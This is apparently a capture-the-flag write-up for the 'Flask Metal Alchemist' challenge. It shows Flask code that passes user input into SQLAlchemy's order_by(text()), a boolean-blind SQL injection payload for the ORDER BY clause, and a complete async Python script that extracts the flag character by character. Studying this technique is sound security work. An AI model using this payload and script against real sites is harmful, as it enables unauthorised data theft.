# Flask Metal Alchemist

It seems like the website let us search for metals by name 

![Untitled](writeup_media/Untitled%2012.png)

Notice this part from source code

```python
if order is None:
    metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
else:
    metals = Metal.query.filter(
        Metal.name.like("%{}%".format(search))
    ).order_by(text(order))
```

We can see that the code uses the `order_by()` method with an untrusted input, which can easily lead to SQL injection vulnerability

Build a local server from the given source code and send the payload `search=a&order=abc`. Server send back a status code 500 (due to no column named `abc`). Read the log to read the full query server used.

![Untitled](writeup_media/Untitled%2013.png)

After an intensive trial-and-error, I crafted the a SQLi blind boolean-based payload for param `order` to brute-force char by char in flag.

```sql
(SELECT CASE
           WHEN (SELECT HEX(SUBSTR(flag, §pos§, 1)) FROM flag) = HEX('§char§')
               THEN atomic_number
           ELSE name
           END)
```

Combine with the query server used

```sql
SELECT metals.atomic_number AS metals_atomic_number, metals.symbol AS metals_symbol, metals.name AS metals_name
FROM metals
WHERE metals.name LIKE ?
ORDER BY (SELECT CASE
                     WHEN (SELECT HEX(SUBSTR(flag, §pos§, 1)) FROM flag) = HEX('§char§')
                         THEN atomic_number
                     ELSE name
                     END)
```

The given query will search for metal with a given name, then order it by the part `(SELECT ... END)`

The `(SELECT ... END)` will return column `atomic_number` if hex value of char at index `§pos§` equal to hex value of `§char§`, otherwise return colum `name   `

As a result, we can tell true/false by observing the order of metal's name in the response

Let `§pos§` = `1`, `§char§` = `f`, we receive a table sorted by `atomic_number` if the char at index `1` is `f`

![Untitled](writeup_media/Untitled%2014.png)

Try `§pos§` = `1`, `§char§` = `g`, we receive a table sorted by `name` → the char at index `1` is not `g`

![Untitled](writeup_media/Untitled%2015.png)

We can use python for brute-forcing

```python
import asyncio
import time

import aiohttp
import string

URL = 'http://challenge.nahamcon.com:31140'

AVAIL_CHAR = string.ascii_lowercase + '{}_'

async def post(s: aiohttp.ClientSession, pos, char):
    """
    Send a POST request
    :param s: request session
    :param pos: position to check
    :param char: character to check
    :return: response's body in bytes
    """
    try:
        data = {
            'search': 'a',
            'order': f'(SELECT CASE WHEN (SELECT HEX(SUBSTR(flag, {pos}, 1)) FROM flag) = HEX(\'{char}\') THEN atomic_number ELSE name END)'
        }
        async with s.post(url=URL, data=data) as res:
            return await res.read()

    except Exception as e:
        print(f"Unable to POST due to {e}")
        return None

async def post_proc(s: aiohttp.ClientSession, pos, char):
    """
    Handle sending a POST request and analyze the response
    :param s: request session
    :param pos: position to check
    :param char: character to check
    :return: None if response is invalid or boolean check is failed, else return tuple (pos, char)
    """
    res = await post(s, pos, char)

    if res is None:
        return None

    return (pos, char) if res.find(b'Actinium') > res.find(b'Magnesium') else None

def parse_flag(res):
    flag = [x for x in res if x is not None]
    print(flag)
    return ''.join([x[1] for x in flag])

async def main():
    async with aiohttp.ClientSession() as s:
        res = []

        # avoid using 2 for loop in asyncio.gather() due to server's overload
        for pos in range(1, 31):
            res += await asyncio.gather(*[post_proc(s, pos, char) for char in AVAIL_CHAR])
            print(parse_flag(res))

if __name__ == '__main__':
    asyncio.run(main())
    time.sleep(1)
    print('Done')
```

<aside>
🚩 flag{order_by_blind}
</aside>
